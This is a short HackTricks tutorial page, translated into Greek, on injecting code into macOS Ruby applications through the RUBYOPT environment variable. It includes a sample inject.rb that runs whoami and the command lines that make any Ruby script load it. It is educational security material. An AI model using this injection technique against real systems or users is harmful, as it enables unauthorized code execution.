# macOS Ruby Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## RUBYOPT

Χρησιμοποιώντας αυτήν την μεταβλητή περιβάλλοντος είναι δυνατόν να **προσθέσετε νέες παραμέτρους** στη **ruby** όποτε εκτελείται. Αν και η παράμετρος **`-e`** δεν μπορεί να χρησιμοποιηθεί για να καθορίσει τον κώδικα ruby που θα εκτελεστεί, είναι δυνατόν να χρησιμοποιηθούν οι παράμετροι **`-I`** και **`-r`** για να προστεθεί ένας νέος φάκελος στη διαδρομή φόρτωσης βιβλιοθηκών και στη συνέχεια **να καθορίσετε μια βιβλιοθήκη για φόρτωση**.

Δημιουργήστε τη βιβλιοθήκη **`inject.rb`** στο **`/tmp`**:

{% code title="inject.rb" %}
```ruby
puts `whoami`
```
{% endcode %}

Δημιουργήστε οπουδήποτε ένα σενάριο ruby όπως:

{% code title="hello.rb" %}
```ruby
puts 'Hello, World!'
```
{% endcode %}

Στη συνέχεια, κάντε ένα αυθαίρετο σενάριο ruby να το φορτώσει με:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Διασκεδαστικό γεγονός, λειτουργεί ακόμη και με την παράμετρο **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
